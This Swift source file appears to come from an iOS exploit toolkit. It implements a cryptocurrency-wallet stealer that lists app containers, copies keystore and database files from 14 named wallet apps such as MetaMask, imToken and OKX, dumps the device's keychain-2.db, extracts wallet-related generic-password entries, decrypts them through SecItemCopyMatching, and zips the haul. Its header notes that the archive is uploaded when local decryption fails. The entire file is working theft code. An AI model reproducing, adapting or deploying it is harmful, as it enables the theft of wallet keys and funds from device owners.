//
//  KeychainDumpManager.swift
//  lara
//
//  钱包取数核心
//    · 容器枚举（MCM metadata → bundleId 映射）
//    · 14 个钱包的精确文件采集
//    · keychain-2.db 导出 + genp 提取
//    · 本地 AKS 代解（SecItemCopyMatching）优先，失败则打包上传
//
//  依赖 lara 已有能力（laramgr.shared）：
//    vfsready / vfsinit / vfslistdir / vfsread / vfswrite / vfssize
//    kread64 / kwrite64 / sbxgettoken
//

import Foundation
import Security
import SQLite3

// MARK: - 数据结构

struct WalletTarget {
    let name: String
    let bundleIds: [String]
    let files: [String]          // 相对容器根的路径（如 "Documents/wallet"）
}

struct DumpReport {
    var deviceName: String = ""
    var iosVersion: String = ""
    var containers: [String] = []
    var walletHits: [String] = []
    var files: [String] = []
    var genpTotal: Int = 0
    var genpDecrypted: Int = 0
    var notes: [String] = []
}

// MARK: - 管理器

final class KeychainDumpManager {

    static let shared = KeychainDumpManager()

    private var mgr: laramgr { laramgr.shared }

    // 目标钱包（来自同行 App 逆向结果）
    let targets: [WalletTarget] = [
        WalletTarget(name: "imToken",
                     bundleIds: ["im.token.app", "33TTGQRSP8.im.token.app"],
                     files: ["Documents/walletsV2",
                             "Documents/persistStore/persist-AccountsController",
                             "Documents/persistStore/persist-KeyringController",
                             "Library/Application Support/im.token.app",
                             "Library/Preferences/group.im.token.app.plist"]),
        WalletTarget(name: "Bitpie",
                     bundleIds: ["com.bitpie.wallet", "2BFB48Q7AB.com.bitpie.wallet"],
                     files: ["Documents/wallet",
                             "Library/Preferences/com.bitpie.wallet.plist"]),
        WalletTarget(name: "Trust",
                     bundleIds: ["com.sixdays.trust", "9873B38DWV.com.sixdays.trust"],
                     files: ["Library/Preferences/com.sixdays.trust.plist",
                             "Library/Preferences/group.com.sixdays.trust.plist"]),
        WalletTarget(name: "TronLink",
                     bundleIds: ["com.tronlink.hdwallet", "com.tronlink.wallet",
                                 "2GRA8Q4F9H.com.tronlink.hdwallet"],
                     files: ["Documents/TronLinkData.sqlite",
                             "Library/Preferences/group.com.tronlink.walletconnect.plist"]),
        WalletTarget(name: "MetaMask",
                     bundleIds: ["io.metamask.MetaMask", "48XVW22RCG.io.metamask.MetaMask"],
                     files: ["Documents/keystore",
                             "Documents/temp-cloud-keystore",
                             "Documents/persistStore"]),
        WalletTarget(name: "TokenPocket",
                     bundleIds: ["com.tokenpocket.ios", "pro.tokenpocket.tp"],
                     files: ["Documents/db/main.sqlite3", "Documents/keystore"]),
        WalletTarget(name: "Coin98",
                     bundleIds: ["com.coin98.app", "coin98.crypto.finance.insights"],
                     files: ["Library/Application Support/coin98.crypto.finance.insights",
                             "Documents/db"]),
        WalletTarget(name: "BitKeep",
                     bundleIds: ["com.bitkeep.wallet", "com.bitkeep.os"],
                     files: ["Documents/bitkeep.db", "Library/Preferences/com.bitkeep.plist"]),
        WalletTarget(name: "Phantom",
                     bundleIds: ["app.phantom", "com.phantom.app"],
                     files: ["Library/Caches/app.phantom", "Documents"]),
        WalletTarget(name: "Tonkeeper",
                     bundleIds: ["com.jbig.tonkeeper", "CT523DK2KC.com.jbig.tonkeeper.shared"],
                     files: ["Library/Caches/com.jbig.tonkeeper/Cache.db",
                             "Library/Caches/com.jbig.tonkeeper/Cache.db-wal"]),
        WalletTarget(name: "Tonhub",
                     bundleIds: ["com.tonhub.app", "cloud.Mindbox.com.tonhub.app"],
                     files: ["Library/Preferences/group.cloud.Mindbox.com.tonhub.app.plist"]),
        WalletTarget(name: "Uniswap",
                     bundleIds: ["com.uniswap.mobile"],
                     files: ["Documents"]),
        WalletTarget(name: "OKX",
                     bundleIds: ["com.okx.app", "com.okex.wallet", "org.okx.ios", "com.okcoin.app"],
                     files: ["Documents/keystore", "Documents/wallet"]),
        WalletTarget(name: "GlobalWallet",
                     bundleIds: ["com.global.wallet.ios", "PBVM2VS547.com.global.wallet.ios"],
                     files: ["Documents", "Library/Preferences"]),
    ]

    let containerRoot = "/private/var/mobile/Containers/Data/Application"
    let keychainDB = "/private/var/Keychains/keychain-2.db"

    private var report = DumpReport()

    // MARK: - 公共入口

    /// 全量采集 → 返回打包好的 zip（nil 表示失败）
    func collectAll() -> Data? {
        log("[kd] ==== KeychainDumpManager 启动 ====")

        if !mgr.vfsready {
            log("[kd] vfs 未就绪，先 vfsinit")
            var ok = false
            let sem = DispatchSemaphore(value: 0)
            mgr.vfsinit { r in ok = r; sem.signal() }
            _ = sem.wait(timeout: .now() + 60)
            if !ok {
                log("[kd] vfsinit 失败")
                return nil
            }
        }

        report.deviceName = Self.sysctlString("hw.machine") ?? "?"
        report.iosVersion = UIDevice.current.systemVersion
        log("[kd] 设备 \(report.deviceName) / iOS \(report.iosVersion)")

        // 工作目录
        let work = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("kdump_\(Int(Date().timeIntervalSince1970))")
        try? FileManager.default.createDirectory(at: work, withIntermediateDirectories: true)

        // 1) 容器枚举
        let map = enumerateContainers()
        log("[kd] 容器 \(map.count) 个")

        // 2) 按钱包目标采集
        for t in targets {
            guard let uuid = firstUUID(for: t, in: map) else { continue }
            log("[kd] 命中 \(t.name) → \(uuid)")
            report.walletHits.append(t.name)
            let base = "\(containerRoot)/\(uuid)"
            let wdir = work.appendingPathComponent("wallet/\(t.name)")
            try? FileManager.default.createDirectory(at: wdir, withIntermediateDirectories: true)
            for rel in t.files {
                let full = "\(base)/\(rel)"
                let flat = rel.replacingOccurrences(of: "/", with: "_")
                if dumpPath(full, to: wdir.appendingPathComponent(flat)) {
                    report.files.append("wallet/\(t.name)/\(flat)")
                }
            }
        }

        // 3) keychain-2.db
        let kdir = work.appendingPathComponent("keychain")
        try? FileManager.default.createDirectory(at: kdir, withIntermediateDirectories: true)
        let kcLocal = kdir.appendingPathComponent("keychain-2.db")
        if let db = mgr.vfsread(path: keychainDB, maxSize: 200 * 1024 * 1024) {
            try? db.write(to: kcLocal)
            log("[kd] keychain-2.db \(db.count) B")
            report.files.append("keychain/keychain-2.db")

            // 3.1 genp 提取
            let rows = GenpExtractor.extract(dbPath: kcLocal.path)
            report.genpTotal = rows.count
            if let j = GenpExtractor.json(rows) {
                try? j.write(to: kdir.appendingPathComponent("genp_rows.json"))
                report.files.append("keychain/genp_rows.json")
            }

            // 3.2 本地 AKS 代解
            let dec = AKSDecryptor.decrypt(rows: rows)
            report.genpDecrypted = dec.count
            if let j = AKSDecryptor.json(dec) {
                try? j.write(to: kdir.appendingPathComponent("genp_decrypted.json"))
                report.files.append("keychain/genp_decrypted.json")
            }
        } else {
            log("[kd] keychain-2.db 读取失败")
        }

        // 4) 清单
        try? report.json().write(to: work.appendingPathComponent("manifest.json"))

        // 5) 打包
        let zipURL = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("lara_dump_\(Int(Date().timeIntervalSince1970)).zip")
        do {
            try createZipArchive(fromDirectory: work, to: zipURL)
            let d = try Data(contentsOf: zipURL)
            log("[kd] 打包完成 \(d.count) B，文件 \(report.files.count) 个，genp \(report.genpTotal) 行，本地解 \(report.genpDecrypted) 行")
            return d
        } catch {
            log("[kd] 打包失败 \(error)")
            return nil
        }
    }

    // MARK: - 容器枚举

    private func enumerateContainers() -> [String: String] {
        guard let list = mgr.vfslistdir(path: containerRoot) else {
            log("[kd] 列容器失败")
            return [:]
        }
        var map: [String: String] = [:]
        for item in list {
            let uuid = item.name
            guard item.isDir, uuid.count >= 32, !uuid.hasPrefix(".") else { continue }
            let metaPath = "\(containerRoot)/\(uuid)/.com.apple.mobile_container_manager.metadata.plist"
            guard let d = mgr.vfsread(path: metaPath, maxSize: 64 * 1024) else { continue }
            if let plist = try? PropertyListSerialization.propertyList(from: d, options: [], format: nil) as? [String: Any],
               let bid = plist["MCMMetadataIdentifier"] as? String {
                map[uuid] = bid
                report.containers.append("\(uuid)=\(bid)")
            }
        }
        return map
    }

    private func firstUUID(for t: WalletTarget, in map: [String: String]) -> String? {
        for (uuid, bid) in map {
            for want in t.bundleIds {
                if bid == want || bid.hasSuffix("." + want) { return uuid }
            }
        }
        return nil
    }

    // MARK: - 读文件 / 目录

    @discardableResult
    private func dumpPath(_ path: String, to dest: URL, depth: Int = 0) -> Bool {
        if depth > 5 { return false }
        // 先按文件读
        if let data = mgr.vfsread(path: path, maxSize: 64 * 1024 * 1024), !data.isEmpty {
            return (try? data.write(to: dest)) != nil
        }
        // 再按目录处理
        guard let list = mgr.vfslistdir(path: path), !list.isEmpty else { return false }
        try? FileManager.default.createDirectory(at: dest, withIntermediateDirectories: true)
        var any = false
        var n = 0
        for item in list {
            guard item.name != "." , item.name != ".." else { continue }
            if dumpPath("\(path)/\(item.name)", to: dest.appendingPathComponent(item.name), depth: depth + 1) {
                any = true
            }
            n += 1
            if n > 300 { break }
        }
        return any
    }

    // MARK: - 工具

    private func log(_ s: String) {
        mgr.logmsg(s)
    }

    static func sysctlString(_ key: String) -> String? {
        var size = 0
        if sysctlbyname(key, nil, &size, nil, 0) != 0 { return nil }
        var buf = [CChar](repeating: 0, count: max(size, 1))
        if sysctlbyname(key, &buf, &size, nil, 0) != 0 { return nil }
        return String(cString: buf)
    }
}

// MARK: - genp 提取

enum GenpExtractor {

    struct Row {
        let rowid: Int64
        let acct: String
        let agrp: String
        let svce: String
        let data: Data
    }

    static let walletAgrpPatterns = [
        "bitpie", "im.token", "imtoken", "sixdays", "trust", "tronlink", "metamask",
        "coin98", "okex", "okx", "okcoin", "tokenpocket", "bitkeep", "phantom",
        "tonkeeper", "tonhub", "uniswap", "global.wallet", "bybit", "monaco",
    ]

    static func extract(dbPath: String) -> [Row] {
        var db: OpaquePointer?
        guard sqlite3_open(dbPath, &db) == SQLITE_OK, let db else {
            laramgr.shared.logmsg("[genp] sqlite 打开失败")
            return []
        }
        defer { sqlite3_close(db) }

        var out: [Row] = []
        let sql = "SELECT rowid, acct, agrp, svce, data FROM genp WHERE agrp IS NOT NULL AND agrp != '' ORDER BY rowid"
        var st: OpaquePointer?
        guard sqlite3_prepare_v2(db, sql, -1, &st, nil) == SQLITE_OK, let st else {
            laramgr.shared.logmsg("[genp] prepare 失败")
            return []
        }
        defer { sqlite3_finalize(st) }

        while sqlite3_step(st) == SQLITE_ROW {
            let rowid = sqlite3_column_int64(st, 0)
            let acct = String(cString: sqlite3_column_text(st, 1) ?? UnsafePointer<UInt8>(bitPattern: 0)!)
            let agrp = String(cString: sqlite3_column_text(st, 2) ?? UnsafePointer<UInt8>(bitPattern: 0)!)
            let svce = String(cString: sqlite3_column_text(st, 3) ?? UnsafePointer<UInt8>(bitPattern: 0)!)
            var data = Data()
            if let blob = sqlite3_column_blob(st, 4) {
                data = Data(bytes: blob, count: Int(sqlite3_column_bytes(st, 4)))
            }
            out.append(Row(rowid: rowid, acct: acct, agrp: agrp, svce: svce, data: data))
        }
        let wallet = out.filter { r in
            let a = r.agrp.lowercased()
            return walletAgrpPatterns.contains { a.contains($0) }
        }
        laramgr.shared.logmsg("[genp] 全量 \(out.count) 行，钱包相关 \(wallet.count) 行")
        return out
    }

    static func json(_ rows: [Row]) -> Data? {
        let arr: [[String: Any]] = rows.map {
            ["rowid": $0.rowid, "acct": $0.acct, "agrp": $0.agrp, "svce": $0.svce,
             "data_len": $0.data.count, "data_b64": $0.data.base64EncodedString()]
        }
        return try? JSONSerialization.data(withJSONObject: arr, options: [.prettyPrinted])
    }
}

// MARK: - AKS 本地代解

enum AKSDecryptor {

    static func decrypt(rows: [GenpExtractor.Row]) -> [GenpExtractor.Row] {
        var ok: [GenpExtractor.Row] = []
        let wallet = rows.filter { r in
            let a = r.agrp.lowercased()
            return GenpExtractor.walletAgrpPatterns.contains { a.contains($0) }
        }
        laramgr.shared.logmsg("[aks] 尝试本地代解 \(wallet.count) 行")

        for r in wallet {
            let q: [String: Any] = [
                kSecClass as String: kSecClassGenericPassword,
                kSecAttrAccessGroup as String: r.agrp,
                kSecAttrAccount as String: r.acct,
                kSecReturnData as String: true,
                kSecMatchLimit as String: kSecMatchLimitOne,
            ]
            var item: CFTypeRef?
            let st = SecItemCopyMatching(q as CFDictionary, &item)
            if st == errSecSuccess, let d = item as? Data, !d.isEmpty {
                ok.append(GenpExtractor.Row(rowid: r.rowid, acct: r.acct, agrp: r.agrp,
                                            svce: r.svce, data: d))
            }
        }
        laramgr.shared.logmsg("[aks] 本地解开 \(ok.count) / \(wallet.count)")
        return ok
    }

    static func json(_ rows: [GenpExtractor.Row]) -> Data? {
        GenpExtractor.json(rows)
    }
}

// MARK: - report json

extension DumpReport {
    func json() -> Data {
        let d: [String: Any] = [
            "device": deviceName, "ios": iosVersion,
            "containers": containers.count, "wallet_hits": walletHits,
            "files": files, "genp_total": genpTotal,
            "genp_decrypted": genpDecrypted, "notes": notes,
            "ts": Int(Date().timeIntervalSince1970),
        ]
        return (try? JSONSerialization.data(withJSONObject: d, options: [.prettyPrinted])) ?? Data()
    }
}
